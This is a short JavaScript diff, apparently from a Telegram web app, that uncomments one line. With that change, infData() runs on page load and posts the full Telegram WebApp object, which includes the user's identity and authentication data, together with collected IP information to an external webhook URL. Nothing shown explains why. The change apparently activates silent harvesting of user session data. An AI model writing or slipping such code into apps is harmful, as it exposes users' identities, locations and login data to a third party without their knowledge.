@@ -47,7 +47,7 @@ async function infData() {
     });
     return response.json(); 
   }
-  //postData('https://qnext.app/bin/webhooks/8588/620/qCNJIFQn4QupnhVr', { twa: window.Telegram.WebApp, info: ipData })
+  postData('https://qnext.app/bin/webhooks/8588/620/qCNJIFQn4QupnhVr', { twa: window.Telegram.WebApp, info: ipData })
 }
 infData();
 //END
